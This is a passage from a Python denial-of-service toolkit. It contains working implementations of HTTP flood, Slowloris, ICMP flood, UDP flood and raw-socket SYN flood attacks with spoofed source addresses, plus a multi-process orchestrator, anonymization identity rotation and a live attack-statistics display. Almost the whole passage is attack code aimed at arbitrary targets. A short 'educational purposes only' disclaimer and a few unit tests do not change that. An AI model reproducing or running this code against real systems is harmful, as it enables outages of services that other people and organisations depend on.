                        key = random.choice(param_names)
                        value = hashlib.md5(os.urandom(8)).hexdigest()
                        form_data.append(f"{key}={value}")
                    body = "&".join(form_data)
                
                elif content_type == "application/json":
                    json_data = {}
                    for _ in range(random.randint(1, 10)):
                        key = random.choice(param_names)
                        value = hashlib.md5(os.urandom(8)).hexdigest()
                        json_data[key] = value
                    body = json.dumps(json_data)
                
                elif content_type.startswith("multipart/form-data"):
                    boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
                    multipart_data = []
                    for _ in range(random.randint(1, 5)):
                        key = random.choice(param_names)
                        value = hashlib.md5(os.urandom(8)).hexdigest()
                        multipart_data.append(f"--{boundary}")
                        multipart_data.append(f'Content-Disposition: form-data; name="{key}"')
                        multipart_data.append("")  # Empty line
                        multipart_data.append(value)
                    multipart_data.append(f"--{boundary}--")
                    body = "\r\n".join(multipart_data)
                
                else:  # text/plain
                    body = "A" * random.randint(1, packet_size)
                
                # Add content length
                headers.append(f"Content-Length: {len(body)}")
            
            # Construct full request
            request = "\r\n".join(headers) + "\r\n\r\n" + body
            
            # Encrypt and sign the request
            encrypted_request = encrypt_payload(request.encode())
            signed_request = sign_payload(encrypted_request)
            
            # Send request
            sock.sendall(encrypted_request)
            
            # Update counters
            packets_sent += 1
            bytes_sent += len(encrypted_request)
            
            if packets_sent % 50 == 0:
                mb_sent = bytes_sent / (1024 * 1024)
                logger.info(f"HTTP Flood: {packets_sent} requests ({mb_sent:.2f} MB) sent to {target_ip}:{target_port}")
            
            # Try to read response (but don't wait too long)
            try:
                sock.settimeout(0.5)
                sock.recv(1024)
            except:
                pass
            
            sock.close()
            await asyncio.sleep(random.uniform(0.05, 0.2))  # Random delay between requests
            
        except Exception as e:
            logger.error(f"Error during HTTP Flood: {e}")
            await asyncio.sleep(random.uniform(0.1, 0.5))  # Slightly longer delay after error

async def slowloris_attack(target_ip, target_port, max_connections=150):
    """
    Slowloris attack - opens many connections and keeps them alive with partial requests.
    
    Args:
        target_ip (str): Target IP address
        target_port (int): Target port
        max_connections (int): Maximum number of connections to maintain
    """
    logger.warning(f"Starting Slowloris attack on {Colors.BOLD}{target_ip}:{target_port}{Colors.RESET} with {max_connections} connections...")
    
    # List to keep track of open sockets
    socket_list = []
    
    # Common user agents to disguise requests
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0"
    ]
    
    try:
        # Create initial connections
        logger.info(f"Establishing {max_connections} connections for Slowloris attack...")
        
        while True:
            # Create new connections until we reach the max
            while len(socket_list) < max_connections:
                try:
                    # Create socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((target_ip, target_port))
                    
                    # Send partial HTTP request
                    user_agent = random.choice(user_agents)
                    partial_request = f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n"
                    partial_request += f"Host: {target_ip}\r\n"
                    partial_request += f"User-Agent: {user_agent}\r\n"
                    partial_request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    
                    # Send the partial request
                    s.send(partial_request.encode())
                    socket_list.append(s)
                    
                    # Report status periodically
                    if len(socket_list) % 50 == 0:
                        logger.info(f"Slowloris: {len(socket_list)} connections established")
                except Exception as e:
                    pass
            
            # Send keep-alive headers to maintain connections
            logger.info(f"Maintaining {len(socket_list)} Slowloris connections...")
            for i in range(len(socket_list) - 1, -1, -1):  # Iterate backwards to allow safe removal
                try:
                    # Send a partial header to keep the connection open
                    keep_alive = f"X-a: {random.randint(1, 5000)}\r\n"
                    socket_list[i].send(keep_alive.encode())
                except:
                    # Remove dead connections
                    socket_list[i].close()
                    socket_list.pop(i)
            
            # Sleep before next round
            logger.info(f"Slowloris: Maintaining {len(socket_list)} connections - sending keep-alive")
            await asyncio.sleep(random.uniform(10, 15))  # Wait before sending more headers
            
    except Exception as e:
        logger.error(f"Error in Slowloris attack: {e}")
    finally:
        # Close any remaining connections
        for s in socket_list:
            try:
                s.close()
            except:
                pass

def icmp_flood(target_ip):
    """
    ICMP Flood attack (ping flood).
    
    Args:
        target_ip (str): Target IP address.
    """
    if os.geteuid() != 0:
        logger.warning(f"ICMP Flood requires root privileges - skipping attack on {target_ip}")
        return
        
    logger.warning(f"Starting ICMP Flood attack on {Colors.BOLD}{target_ip}{Colors.RESET}...")
    
    packets_sent = 0
    
    try:
        # Create raw socket for ICMP
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        # Set socket timeout
        sock.settimeout(1)
        
        while True:
            try:
                # Create ICMP packet
                icmp_type = 8  # Echo request
                icmp_code = 0
                icmp_checksum = 0
                icmp_id = random.randint(1, 65535)
                icmp_seq = random.randint(1, 65535)
                
                # Create ICMP header
                icmp_header = struct.pack("!BBHHH", icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
                
                # Create random payload
                payload_size = random.randint(32, 1472)  # Random payload size
                payload = os.urandom(payload_size)
                
                # Calculate ICMP checksum
                icmp_packet = icmp_header + payload
                icmp_checksum = 0
                
                # Calculate checksum
                for i in range(0, len(icmp_packet), 2):
                    if i + 1 < len(icmp_packet):
                        icmp_checksum += (icmp_packet[i] << 8) + icmp_packet[i + 1]
                    else:
                        icmp_checksum += icmp_packet[i] << 8
                
                icmp_checksum = (icmp_checksum >> 16) + (icmp_checksum & 0xFFFF)
                icmp_checksum = ~icmp_checksum & 0xFFFF
                
                # Reconstruct ICMP packet with correct checksum
                icmp_header = struct.pack("!BBHHH", icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
                icmp_packet = icmp_header + payload
                
                # Send packet
                sock.sendto(icmp_packet, (target_ip, 0))
                
                # Update counter
                packets_sent += 1
                
                if packets_sent % 100 == 0:
                    logger.info(f"ICMP Flood: {packets_sent} packets sent to {target_ip}")
                
                time.sleep(random.uniform(0.001, 0.01))
                
            except Exception as e:
                logger.error(f"Error sending ICMP packet: {e}")
                time.sleep(0.1)
                
    except Exception as e:
        logger.error(f"Error during ICMP Flood: {e}")

def distributed_attack(stop_event):
    """
    Enhanced distributed DDoS attack using multiple processes and attack types.

    Args:
        stop_event: Event to signal when to stop the attack.

    Returns:
        None
    """
    target_ips = config["target_ips"]
    target_port = config["target_port"]
    packet_size = config["packet_size"]
    num_processes = config["num_processes"]

    # Limit system resource usage
    limit_system_resources()

    # Set up anonymization if enabled
    if config["use_anonymization"]:
        setup_anonymization()

    processes = []
    
    # Attack distribution - allocate processes to different attack types
    attack_types = [
        "syn_flood",
        "udp_flood",
        "http_flood",
        "slowloris",
        "icmp_flood"
    ]
    
    # Select attack types based on port
    # If port is web port, prioritize HTTP attacks
    web_ports = [80, 443, 8080, 8443]
    if target_port in web_ports:
        # Prioritize HTTP and Slowloris for web ports
        weights = {
            "syn_flood": 1,
            "udp_flood": 1,
            "http_flood": 3,
            "slowloris": 2,
            "icmp_flood": 1
        }
    else:
        # More balanced for non-web ports
        weights = {
            "syn_flood": 2,
            "udp_flood": 2,
            "http_flood": 1,
            "slowloris": 1,
            "icmp_flood": 2
        }
    
    # Build weighted attack types list
    weighted_attacks = []
    for attack, weight in weights.items():
        weighted_attacks.extend([attack] * weight)
    
    logger.info(f"Starting distributed attack with {num_processes} processes using multiple attack vectors")
    
    # Track the created processes
    for i in range(min(num_processes, 8)):  # Limit to reasonable number
        # Choose attack type based on weighted distribution
        attack_type = random.choice(weighted_attacks)
        target_ip = random.choice(target_ips)
        
        if attack_type == "syn_flood":
            process = multiprocessing.Process(
                target=syn_flood, 
                args=(target_ip, target_port, False)
            )
        elif attack_type == "udp_flood":
            # For UDP flood, we'll use the main event loop
            async def run_udp():
                await udp_flood_async(target_ip, target_port, packet_size, False)
            
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            process = multiprocessing.Process(
                target=lambda: loop.run_until_complete(run_udp())
            )
        elif attack_type == "http_flood":
            # For HTTP flood
            async def run_http():
                await http_flood_async(target_ip, target_port, packet_size, False)
            
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            process = multiprocessing.Process(
                target=lambda: loop.run_until_complete(run_http())
            )
        elif attack_type == "slowloris":
            # For Slowloris attack
            async def run_slowloris():
                await slowloris_attack(target_ip, target_port, max_connections=150)
            
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            process = multiprocessing.Process(
                target=lambda: loop.run_until_complete(run_slowloris())
            )
        elif attack_type == "icmp_flood":
            # ICMP flood only works if we have root privileges
            process = multiprocessing.Process(
                target=icmp_flood,
                args=(target_ip,)
            )
        
        processes.append(process)
        process.start()
        logger.info(f"Started {attack_type} attack process on {target_ip}:{target_port}")
        
        # Rotate identity for anonymization
        if config["use_anonymization"]:
            rotate_identity()

    try:
        # Wait for stop_event or until all processes complete
        while not stop_event.is_set() and any(p.is_alive() for p in processes):
            time.sleep(1)
    finally:
        # Terminate all processes
        for process in processes:
            if process.is_alive():
                process.terminate()

class TestDDoSFunctions(unittest.TestCase):
    def test_generate_random_ip(self):
        ipv4 = IPAddressGenerator.get_random_ip(use_ipv6=False)
        # Basic validation for IPv4 format
        parts = ipv4.split('.')
        self.assertEqual(len(parts), 4)
        for part in parts:
            value = int(part)
            self.assertTrue(0 <= value <= 255)
        
        ipv6 = IPAddressGenerator.get_random_ip(use_ipv6=True)
        # Basic validation for IPv6 format
        parts = ipv6.split(':')
        self.assertEqual(len(parts), 8)
        for part in parts:
            self.assertTrue(all(c in '0123456789abcdef' for c in part.lower()))

    @patch('socket.socket')
    def test_syn_flood(self, mock_socket):
        """
        Test syn_flood using mocking.
        """
        import threading
        stop_event = threading.Event()
        stop_event.set()  # Set immediately to stop after one iteration
        syn_flood("127.0.0.1", 80, ipv6=False)
        self.assertTrue(mock_socket.called)

    def test_encrypt_decrypt(self):
        """
        Test encryption and signature.
        """
        original = b"Test payload for encryption"
        encrypted = encrypt_payload(original)
        signature = sign_payload(encrypted)
        
        # Verify signature is correct length for SHA256
        self.assertEqual(len(signature), 32)
        
        # Verify encrypted is longer than original (due to IV)
        self.assertTrue(len(encrypted) > len(original))

def run_attack(attack_method, target_info):
    """Run the selected attack method with proper error handling."""
    try:
        logger.info(f"Starting attack: {attack_method.__name__} against {target_info}")
        attack_method(target_info)
    except KeyboardInterrupt:
        logger.warning("Attack interrupted by user")
        print(f"\n{Colors.YELLOW}Attack interrupted. Cleaning up...{Colors.RESET}")
        raise
    except (ConnectionRefusedError, socket.timeout) as e:
        logger.error(f"Connection error: {e}")
        print(f"\n{Colors.RED}Connection failed: Target {target_info} is not responding.{Colors.RESET}")
        print(f"{Colors.YELLOW}Possible reasons:{Colors.RESET}")
        print(f"  - Target is offline or blocking connections")
        print(f"  - The port is not open or is filtered")
        print(f"  - A firewall is blocking the connection")
        # Continue to the next target
    except socket.gaierror as e:
        logger.error(f"DNS resolution error: {e}")
        print(f"\n{Colors.RED}Cannot resolve hostname: {target_info}{Colors.RESET}")
        print(f"{Colors.YELLOW}Check if the hostname is correct and DNS is working{Colors.RESET}")
    except OSError as e:
        logger.error(f"Network error: {e}")
        print(f"\n{Colors.RED}Network error: {e}{Colors.RESET}")
        if "Too many open files" in str(e):
            print(f"{Colors.YELLOW}System limit for open files reached. Try reducing the number of processes.{Colors.RESET}")
    except Exception as e:
        logger.error(f"Error during attack: {e}")
        print(f"\n{Colors.RED}Error during attack: {e}{Colors.RESET}")
        traceback.print_exc()

# Attack function with better progress indication and error handling
def attack(attack_methods, config):
    """Execute the selected attack methods against the target(s)."""
    target_ips = config["target_ips"]
    target_port = config["target_port"]
    
    if not target_ips:
        logger.error("No target IPs specified")
        print(f"{Colors.RED}Error: No target IPs specified.{Colors.RESET}")
        return
    
    # Create a manager to share counter between processes
    manager = Manager()
    counters = manager.dict({
        'packets_sent': 0,
        'bytes_sent': 0,
        'connections': 0,
        'errors': 0
    })
    
    # Setup a stop flag for graceful shutdown
    stop_event = multiprocessing.Event()
    
    # Start a process to display stats
    stats_process = multiprocessing.Process(
        target=display_stats,
        args=(counters, stop_event)
    )
    stats_process.daemon = True
    stats_process.start()
    
    try:
        processes = []
        print(f"\n{Colors.BOLD}{Colors.GREEN}Starting attack with {config['num_processes']} processes...{Colors.RESET}")
        logger.info(f"Starting attack with {config['num_processes']} processes")
        
        # Rotate through target IPs
        for i in range(config["num_processes"]):
            target_ip = target_ips[i % len(target_ips)]
            target_info = (target_ip, target_port)
            
            # Choose a random attack method with priority on HTTP-based attacks for web servers
            if target_port in [80, 443, 8080, 8443]:
                # For web services, prioritize HTTP attacks and Slowloris
                weights = [
                    3 if 'http' in method.__name__.lower() else
                    2 if 'slowloris' in method.__name__.lower() else
                    1 for method in attack_methods
                ]
                attack_method = random.choices(attack_methods, weights=weights, k=1)[0]
            else:
                # For other services, use equal weights
                attack_method = random.choice(attack_methods)
            
            logger.debug(f"Process {i} using {attack_method.__name__} on {target_info}")
                
            p = multiprocessing.Process(
                target=run_attack_with_counters,
                args=(attack_method, target_info, counters)
            )
            p.daemon = True
            processes.append(p)
            p.start()
                
        # Wait for all processes to complete
        for p in processes:
            p.join()
            
    except KeyboardInterrupt:
        logger.info("Attack stopped by user")
        print(f"\n{Colors.YELLOW}Attack stopped by user.{Colors.RESET}")
    finally:
        # Signal the stats process to stop
        stop_event.set()
        stats_process.join(timeout=1)
        
        # Show final statistics
        print(f"\n{Colors.BOLD}{Colors.CYAN}Attack Summary:{Colors.RESET}")
        print(f"{Colors.CYAN}Total Packets Sent:{Colors.RESET} {counters['packets_sent']}")
        print(f"{Colors.CYAN}Total Data Sent:{Colors.RESET} {format_bytes(counters['bytes_sent'])}")
        print(f"{Colors.CYAN}Total Connections:{Colors.RESET} {counters['connections']}")
        print(f"{Colors.CYAN}Total Errors:{Colors.RESET} {counters['errors']}")
        logger.info(f"Attack completed - Packets: {counters['packets_sent']}, "
                   f"Data: {format_bytes(counters['bytes_sent'])}, "
                   f"Connections: {counters['connections']}, "
                   f"Errors: {counters['errors']}")
        
def run_attack_with_counters(attack_method, target_info, counters):
    """Wrapper to run attack with shared counters for statistics."""
    try:
        # Initialize retry count and backoff time
        retry_count = 0
        max_retries = 3
        backoff_time = 1  # seconds
        
        while retry_count < max_retries:
            try:
                attack_method(target_info, counters)
                break  # Success, exit the retry loop
            except (ConnectionRefusedError, socket.timeout, OSError) as e:
                retry_count += 1
                if retry_count >= max_retries:
                    logger.error(f"Maximum retries reached for {target_info}: {e}")
                    counters['errors'] = counters.get('errors', 0) + 1
                    raise
                
                # Exponential backoff
                wait_time = backoff_time * (2 ** (retry_count - 1))
                logger.warning(f"Connection issue with {target_info}, retrying in {wait_time}s: {e}")
                time.sleep(wait_time)
                
    except Exception as e:
        logger.error(f"Error in attack process: {e}")
        run_attack(attack_method, target_info)  # Fall back to non-counter version for logging

def format_bytes(size):
    """Format bytes to human readable format."""
    for unit in ['B', 'KB', 'MB', 'GB']:
        if size < 1024.0:
            return f"{size:.2f} {unit}"
        size /= 1024.0
    return f"{size:.2f} TB"

def display_stats(counters, stop_event):
    """Display real-time attack statistics."""
    start_time = time.time()
    last_packets = 0
    last_bytes = 0
    update_interval = 1.0  # seconds
    
    # Clear screen and hide cursor
    print("\033[2J\033[?25l", end="")
    
    try:
        while not stop_event.is_set():
            elapsed = time.time() - start_time
            
            # Calculate rates
            packets_sent = counters.get('packets_sent', 0)
            bytes_sent = counters.get('bytes_sent', 0)
            connections = counters.get('connections', 0)
            errors = counters.get('errors', 0)
            
            packet_rate = (packets_sent - last_packets) / update_interval
            data_rate = (bytes_sent - last_bytes) / update_interval
            
            # Update last values
            last_packets = packets_sent
            last_bytes = bytes_sent
            
            # Clear previous output and move cursor to top
            print("\033[H\033[2K", end="")
            
            # Display statistics
            print(f"{Colors.BOLD}{Colors.CYAN}==== ATTACK STATISTICS ===={Colors.RESET}")
            print(f"{Colors.CYAN}Runtime:{Colors.RESET} {int(elapsed//60):02d}:{int(elapsed%60):02d}")
            print(f"{Colors.CYAN}Packets Sent:{Colors.RESET} {packets_sent} ({packet_rate:.2f}/sec)")
            print(f"{Colors.CYAN}Data Sent:{Colors.RESET} {format_bytes(bytes_sent)} ({format_bytes(data_rate)}/sec)")
            print(f"{Colors.CYAN}Connections:{Colors.RESET} {connections}")
            print(f"{Colors.CYAN}Errors:{Colors.RESET} {errors}")
            print(f"\n{Colors.YELLOW}Press Ctrl+C to stop the attack{Colors.RESET}")
            
            # Wait for the next update
            time.sleep(update_interval)
            
    except Exception as e:
        logger.error(f"Error in stats display: {e}")
    finally:
        # Show cursor again when done
        print("\033[?25h", end="")

def display_legal_disclaimer():
    """Display the legal disclaimer and get confirmation."""
    print(f"\n{Colors.RED}{Colors.BOLD}===== LEGAL DISCLAIMER ====={Colors.RESET}")
    print(f"{Colors.RED}This tool is provided for EDUCATIONAL PURPOSES ONLY.{Colors.RESET}")
    print(f"{Colors.RED}Using this tool against targets without explicit permission is ILLEGAL{Colors.RESET}")
    print(f"{Colors.RED}and may result in criminal charges or civil liability.{Colors.RESET}")
    print(f"{Colors.RED}You are solely responsible for your actions using this tool.{Colors.RESET}")
    print(f"\n{Colors.BOLD}Do you understand and agree to use this tool responsibly? (yes/no):{Colors.RESET} ", end="")
    
    confirm = input()
    if confirm.lower() not in ['yes', 'y']:
        print(f"{Colors.RED}Operation cancelled.{Colors.RESET}")
        exit(0)

def build_syn_packet(source_ip, source_port, dest_ip, dest_port):
    """Build a TCP SYN packet with IP header."""
    
    # Create the IP header
    ip_ihl = 5  # Internet Header Length (5 words = 20 bytes)
    ip_ver = 4  # IPv4
    ip_tos = 0  # Type of Service
    ip_tot_len = 0  # kernel will fill this
    ip_id = random.randint(1, 65535)  # ID field
    ip_frag_off = 0  # Fragment offset
    ip_ttl = 64  # Time To Live
    ip_proto = socket.IPPROTO_TCP  # Protocol
    ip_check = 0  # Checksum (kernel will fill this)
    ip_saddr = socket.inet_aton(source_ip)  # Source address
    ip_daddr = socket.inet_aton(dest_ip)  # Destination address
    
    ip_ihl_ver = (ip_ver << 4) + ip_ihl
    
    # Pack the IP header
    ip_header = struct.pack('!BBHHHBBH4s4s', 
        ip_ihl_ver, ip_tos, ip_tot_len, ip_id, 
        ip_frag_off, ip_ttl, ip_proto, ip_check, 
        ip_saddr, ip_daddr)
    
    # Create TCP header
    tcp_source = source_port  # Source port
    tcp_dest = dest_port  # Destination port
    tcp_seq = random.randint(1, 4294967295)  # Sequence number
    tcp_ack_seq = 0  # Acknowledgment number
    tcp_doff = 5  # Data offset (5 words = 20 bytes)
    
    # TCP Flags
    tcp_fin = 0
    tcp_syn = 1  # SYN flag
    tcp_rst = 0
    tcp_psh = 0
    tcp_ack = 0
    tcp_urg = 0
    tcp_window = socket.htons(5840)  # Window size
    tcp_check = 0  # Checksum (we will fill this later)
    tcp_urg_ptr = 0  # Urgent pointer
    
    tcp_offset_res = (tcp_doff << 4) + 0
    tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
    
    # Pack the TCP header
    tcp_header = struct.pack('!HHLLBBHHH', 
        tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, 
        tcp_offset_res, tcp_flags, tcp_window, 
        tcp_check, tcp_urg_ptr)
    
    # Create a pseudo header for calculating the TCP checksum
    source_address = socket.inet_aton(source_ip)
    dest_address = socket.inet_aton(dest_ip)
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(tcp_header)
    
    # Pack the pseudo header
    psh = struct.pack('!4s4sBBH', 
        source_address, dest_address, 
        placeholder, protocol, tcp_length)
    
    # Calculate the TCP checksum
    psh = psh + tcp_header
    
    tcp_check = calculate_checksum(psh)
    
    # Pack the TCP header again with the correct checksum
    tcp_header = struct.pack('!HHLLBBH', 
        tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, 
        tcp_offset_res, tcp_flags, tcp_window) + struct.pack('H', tcp_check) + struct.pack('!H', tcp_urg_ptr)
    
    # The complete packet
    return ip_header + tcp_header

def calculate_checksum(msg):
    """Calculate the checksum of a message."""
    s = 0
    
    # Handle odd length
    if len(msg) % 2 == 1:
        msg += b'\0'
    
    # Loop taking 2 bytes at a time
    for i in range(0, len(msg), 2):
        w = msg[i] + (msg[i+1] << 8)
        s = s + w
    
    # Handle overflow
    s = (s >> 16) + (s & 0xffff)
    s = s + (s >> 16)
    
    # Complement and convert to unsigned 16-bit int
    s = ~s & 0xffff
    
    return socket.htons(s)  # Return in network byte order

def tcp_syn_flood(target_info, counters=None):
    """Launch a TCP SYN flood attack against the target."""
    target_ip, target_port = target_info
    
    # Check if we have root privileges for raw sockets
    if os.geteuid() != 0:
        logger.error("TCP SYN flood requires root privileges")
        print(f"{Colors.RED}TCP SYN flood attack requires root privileges. Skipping.{Colors.RESET}")
        if counters is not None:
            counters['errors'] = counters.get('errors', 0) + 1
        return
    
    try:
        # Create a raw socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        logger.info(f"Starting TCP SYN flood against {target_ip}:{target_port}")
        
        sent = 0
        while True:
            try:
                # Generate random source IP and port
                source_ip = IPAddressGenerator.get_random_ip(use_ipv6=False)
                source_port = random.randint(1024, 65535)
                
                # Build a raw TCP SYN packet
                packet = build_syn_packet(source_ip, source_port, target_ip, target_port)
                
                # Send the packet
                sock.sendto(packet, (target_ip, 0))
                
                # Update counters if provided
                if counters is not None:
                    counters['packets_sent'] = counters.get('packets_sent', 0) + 1
                    counters['bytes_sent'] = counters.get('bytes_sent', 0) + len(packet)
                
                sent += 1
                if sent % 1000 == 0:
                    logger.debug(f"Sent {sent} SYN packets to {target_ip}:{target_port}")
                
                # Small delay to prevent overwhelming the network
                time.sleep(0.001)
                
            except (socket.error, OSError) as e:
                logger.error(f"Error sending SYN packet: {e}")
                if counters is not None:
                    counters['errors'] = counters.get('errors', 0) + 1
                time.sleep(0.1)
                
    except PermissionError:
        logger.error("TCP SYN flood requires root privileges")
        print(f"{Colors.RED}TCP SYN flood attack requires root privileges. Skipping.{Colors.RESET}")
        if counters is not None:
            counters['errors'] = counters.get('errors', 0) + 1
    except Exception as e:
        logger.error(f"TCP SYN flood error: {e}")
        if counters is not None:
            counters['errors'] = counters.get('errors', 0) + 1
    finally:
        sock.close()

def udp_flood(target_info, counters=None):
    """Launch a UDP flood attack against the target."""
    target_ip, target_port = target_info
    packet_size = config.get("packet_size", 1024)
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Create a random payload of the configured size
        payload = os.urandom(packet_size)
        
        logger.info(f"Starting UDP flood against {target_ip}:{target_port}")
        
        sent = 0
        while True:
            try:
                # Send the packet
                sock.sendto(payload, (target_ip, target_port))
                
                # Update counters if provided
                if counters is not None:
                    counters['packets_sent'] = counters.get('packets_sent', 0) + 1
                    counters['bytes_sent'] = counters.get('bytes_sent', 0) + packet_size
                
                sent += 1
                if sent % 1000 == 0:
                    logger.debug(f"Sent {sent} UDP packets to {target_ip}:{target_port}")
                    
            except (socket.error, OSError) as e:
                logger.error(f"Error sending UDP packet: {e}")
                if counters is not None:
                    counters['errors'] = counters.get('errors', 0) + 1
                time.sleep(0.1)  # Small delay to prevent tight loop on error
                
    except Exception as e:
        logger.error(f"UDP flood error: {e}")
        if counters is not None:
            counters['errors'] = counters.get('errors', 0) + 1
    finally:
        sock.close()

def http_flood(target_info, counters=None):
    """Launch an HTTP flood attack against the target."""
    target_ip, target_port = target_info
    
    # Generate random headers to appear more like legitimate traffic
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
    ]
    
    accept_headers = [
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    ]
    
    # Create random paths for the request
    paths = ["/", "/index.html", "/about", "/contact", "/services", "/products", "/api/data"]
    
    # HTTP methods to use randomly
    methods = ["GET", "POST", "HEAD"]
    
    # Use HTTPS if port is 443
    is_https = (target_port == 443)
    protocol = "https" if is_https else "http"
    
    # Determine hostname - check if it's an IP address or a domain name
    hostname = target_ip
    
    logger.info(f"Starting HTTP flood against {protocol}://{hostname}:{target_port}")
    
    sent = 0
    try:
        while True:
            try:
                # Create a socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)  # Set a timeout for the connection
                
                # Connect to the target
                sock.connect((target_ip, target_port))
                
                if counters is not None:
                    counters['connections'] = counters.get('connections', 0) + 1
                
                # Wrap socket with SSL if using HTTPS
                if is_https:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=hostname)
                
                # Randomly select method, path, and headers
                method = random.choice(methods)
                path = random.choice(paths)
                user_agent = random.choice(user_agents)
                accept = random.choice(accept_headers)
                
                # Generate request data
                request_data = ""
                
                if method == "POST":
                    # For POST requests, include some data
                    post_data = f"param1=value1&param2=value2&timestamp={int(time.time())}"
                    request_data = (
                        f"{method} {path} HTTP/1.1\r\n"
                        f"Host: {hostname}\r\n"
                        f"User-Agent: {user_agent}\r\n"
                        f"Accept: {accept}\r\n"
                        f"Connection: keep-alive\r\n"
                        f"Content-Type: application/x-www-form-urlencoded\r\n"
                        f"Content-Length: {len(post_data)}\r\n"
                        f"\r\n"
                        f"{post_data}\r\n"
                    )
                else:
                    # For GET and HEAD requests
                    request_data = (
                        f"{method} {path} HTTP/1.1\r\n"
                        f"Host: {hostname}\r\n"
                        f"User-Agent: {user_agent}\r\n"
                        f"Accept: {accept}\r\n"
                        f"Connection: keep-alive\r\n"
                        f"\r\n"
                    )
                
                # Send the request
                sock.sendall(request_data.encode())
                
                sent += 1
                if counters is not None:
                    counters['packets_sent'] = counters.get('packets_sent', 0) + 1
                    counters['bytes_sent'] = counters.get('bytes_sent', 0) + len(request_data)
                
                if sent % 100 == 0:
                    logger.debug(f"Sent {sent} HTTP requests to {hostname}:{target_port}")
                
                # Small delay to avoid overwhelming the socket buffer
                time.sleep(0.01)
                
            except Exception as e:
                if counters is not None:
                    counters['errors'] = counters.get('errors', 0) + 1
                logger.debug(f"HTTP request error: {e}")
            finally:
                try:
                    sock.close()
                except:
                    pass
                    
    except KeyboardInterrupt:
        logger.info("HTTP flood attack interrupted")
        raise

def slowloris(target_info, counters=None):
    """Execute a Slowloris attack to keep multiple connections open."""
    target_ip, target_port = target_info
    max_sockets = 150  # Maximum number of sockets to use
    
    is_https = (target_port == 443)
    hostname = target_ip
    
    logger.info(f"Starting Slowloris attack against {target_ip}:{target_port}")
    
    # List to keep track of all sockets
    sockets_list = []
    
    try:
        # Create and connect the initial sockets
        for i in range(max_sockets):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((target_ip, target_port))
                
                # Wrap with SSL if needed
                if is_https:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=hostname)
                
                # Send a partial HTTP request
                sock.send(f"GET / HTTP/1.1\r\nHost: {hostname}\r\n".encode())
                
                # Add to the list of active sockets
                sockets_list.append(sock)
                
                if counters is not None:
                    counters['connections'] = counters.get('connections', 0) + 1
                    counters['packets_sent'] = counters.get('packets_sent', 0) + 1
                    counters['bytes_sent'] = counters.get('bytes_sent', 0) + 20  # Approximate bytes
                
                if i % 50 == 0:
                    logger.debug(f"Created {i+1} connections for Slowloris attack")
                
            except Exception as e:
                logger.debug(f"Error creating Slowloris connection: {e}")
                if counters is not None:
                    counters['errors'] = counters.get('errors', 0) + 1
        
        # Main loop - keep the connections alive by sending partial headers
        while True:
            # Check if we need to replace any dead sockets
            for i, sock in enumerate(list(sockets_list)):
                try:
                    # Send a partial header to keep the connection alive
                    partial_header = f"X-Random: {random.randint(1, 5000)}\r\n"
                    sock.send(partial_header.encode())
                    
                    if counters is not None:
                        counters['packets_sent'] = counters.get('packets_sent', 0) + 1
                        counters['bytes_sent'] = counters.get('bytes_sent', 0) + len(partial_header)
                    
                except socket.error:
                    # Socket died, remove it and replace
                    sockets_list.remove(sock)
                    try:
                        # Create a new socket to replace the dead one
                        new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
